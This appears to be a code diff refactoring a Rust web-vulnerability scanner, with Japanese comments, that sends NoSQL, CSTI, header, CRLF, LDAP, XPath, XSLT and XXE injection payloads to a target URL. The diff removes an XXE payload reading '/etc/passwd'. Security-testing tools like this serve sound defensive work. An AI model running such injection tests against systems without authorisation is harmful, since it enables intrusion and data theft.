@@ -2,16 +2,15 @@ use reqwest::Client;
 use std::collections::HashMap;
 use std::error::Error;
 use serde_json::{json, Value};
-use ldap3::{LdapConn, Scope, SearchEntry};
+use ldap3::{LdapConnAsync, Scope, SearchEntry};
 use quick_xml::events::Event;
 use quick_xml::reader::Reader;
 use sxd_document::{parser, Package};
-use sxd_xpath::{evaluate_xpath,Context, Factory};
+use sxd_xpath::{Context, Factory};
 use libxslt::parser::parse_file; //元は、parse_stylesheet
 use libxml::parser::Parser;
 use libxml::tree::Document;
 use std::env;
-use std::process::exit;
 
 
 
@@ -114,11 +113,7 @@ const XSLT_PAYLOAD: &str =
     </xsl:stylesheet>
     "#;
 
-const XXE_PAYLOAD: &str = r#"<?xml version="1.0"?>
-<!DOCTYPE data [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<data>&xxe;</data>"#;
+
 
 //ファジング関数
 async fn fuzz(url:&str, params: &HashMap<&str, &str>, payloads: &[&str]) {
@@ -129,9 +124,8 @@ async fn fuzz(url:&str, params: &HashMap<&str, &str>, payloads: &[&str]) {
 
     for &payload in payloads {
         let mut test_params = params.clone();
-        let keys: Vec<_> = test_params.keys().cloned().collect();
-        for key in keys {
-            test_params.insert(key, payload);
+        for key in params.keys() {
+            test_params.insert(*key, payload);
         }
 
         let response = client.get(url).query(&test_params).send().await;
@@ -190,7 +184,7 @@ async fn test_csti(url: &str, params: &HashMap<&str, &str>) -> Result<(), Box<dy
         let mut test_params = params.clone();
         test_params.insert("input", payload); //テストするパラメータを挿入
         
-        let response = client.post(url).json(&payload).send().await?;
+        let response = client.post(url).form(&test_params).send().await?;
 
         let body = response.text().await?;
 
@@ -260,7 +254,7 @@ Ok(())
 
     //LDAPインジェクションテストする関数
     async fn test_ldap_injecion(ldap_url: &str, base_dc: &str) -> Result<(), Box<dyn Error>> {
-        let mut ldap = LdapConn::new(ldap_url)?;
+        let (_conn, mut ldap) = LdapConnAsync::new(ldap_url).await?;
 
         for payload in LDAP_PAYLOADS {
             let filter = format!("uid={}", payload);
@@ -270,7 +264,7 @@ Ok(())
                 &base_dc, 
                 Scope::Subtree, 
                 &filter, 
-                vec!["cn", "uid"])?.success()?;
+                vec!["cn", "uid"]).await?.success()?;
 
             for entry in rs {
                 let search_entry = SearchEntry::construct(entry);
@@ -484,24 +478,15 @@ Ok(())
 
     //XXEをテストする関数
     async fn test_xxe(xml_data: &str) -> Result<String, Box<dyn Error>> {
-        let mut reader = Reader::from_str(xml_data);
-        reader.config_mut().trim_text(true);
+        let parser = Parser::default();
+        let doc = parser.parse_string(xml_data)?;
 
-        let mut extracted_data = String::new();
-
-        while let Ok(event) = reader.read_event() {
-            match event {
-                Event::Text(e) => {
-                    extracted_data.push_str(&e.unescape()?.to_string());
-                }
-                Event::Eof => break,
-                _ => {}
-            }
+        if let Some(root) = doc.get_root_element() {
+            return Ok(root.get_content());
         }
- 
 
-        Ok(extracted_data)
-    }
+        Ok(String::new())
+        }
 
 
 #[tokio::main]
@@ -526,47 +511,45 @@ async fn main () -> Result<(), Box<dyn Error>> {
 
     println!("=== NoSQLInjection test ===");
     let base_payload = json!({ "username": "test", "password": "password" });
-    test_nosql_injection(&target_url, base_payload).await;
+    let _ = test_nosql_injection(&target_url, base_payload).await;
 
     println!("=== CSTI Test ===");
-    test_csti(&target_url, &params).await;
+    let _ =test_csti(&target_url, &params).await;
 
     println!("=== HTTP Header Injection Test ===");
-    test_http_header_injection(target_url).await;
+    let _ = test_http_header_injection(target_url).await;
 
     println!("=== LDAP Injection Test ===");
-    let ldap_url= judge_target_url(target_url).await;
-    let binding_ldap = ldap_url.expect("REASON");
-    let ldap_url_str = binding_ldap.as_deref().unwrap_or(""); //ldap_urlをStringから&strに変換
-    let base_dc = get_base_dc(target_url).await;
-    let binding_base_dc = base_dc.expect("REASON");
-    let base_dc_str = binding_base_dc.as_deref().unwrap_or("");//base_dcをStringから&strに変換
+    // `?` を使ってエラーハンドリング
+    let ldap_url = judge_target_url(target_url).await?.ok_or("Failed to get LDAP URL")?;
+    let base_dc = get_base_dc(target_url).await?.ok_or("Failed to get base DC")?;
 
-    match test_ldap_injecion(ldap_url_str, base_dc_str).await {
+
+    match test_ldap_injecion(&ldap_url, &base_dc).await {
         Ok(_) => println!("LDAP Injection test completed."),
         Err(e) => eprintln!("Error: {}", e),
     }
 
     println!("=== JSON Injection Test ===");
-    test_json_injection(target_url).await;
+    let _ = test_json_injection(target_url).await;
 
     println!("=== CSLF Injection Test ===");
-    test_crlf_injection(target_url).await;
+    let _ = test_crlf_injection(target_url).await;
 
     println!("=== Unicode Injection Test ===");
-    test_unicode_injection(target_url).await;
+    let _ = test_unicode_injection(target_url).await;
 
 
     println!("Scan XML file......");
     let tag_name = "title";
-    let mut xml_data = Vec::new();
+    let xml_data = Vec::new();
 
     match scrape_xml(target_url, tag_name).await {
         Ok(results) => {
             for item in &results {
                 println!("Extracted: {}", item);
             }
-            let xml_data: Vec<&str> = results.iter().map(|s| s.as_str()).collect();
+            let _xml_data: Vec<&str> = results.iter().map(|s| s.as_str()).collect();
         }
         Err(e) => eprintln!("Error: {}", e),
     }
@@ -576,12 +559,12 @@ async fn main () -> Result<(), Box<dyn Error>> {
     let xpath_query = "/users/user[name='";
 
     println!("Starting XPath Injection Test...");
-    test_xpath_injection(xml_data.first().map(|s: &String| s.as_str()).unwrap_or(""), xpath_query).await;
+    let _ = test_xpath_injection(xml_data.first().map(|s: &String| s.as_str()).unwrap_or(""), xpath_query).await;
 
     println!("=== XSLT Injection Test ===");
-    test_xslt_injection(XSLT_PAYLOAD, xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;
+    let _ = test_xslt_injection(XSLT_PAYLOAD, xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;
     println!("=== XXE Injection Test ===");
-    test_xxe(xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;
+    let _ = test_xxe(xml_data.first().map(|s: &String| s.as_str()).unwrap_or("")).await;
 
     println!("Finish check!");
     
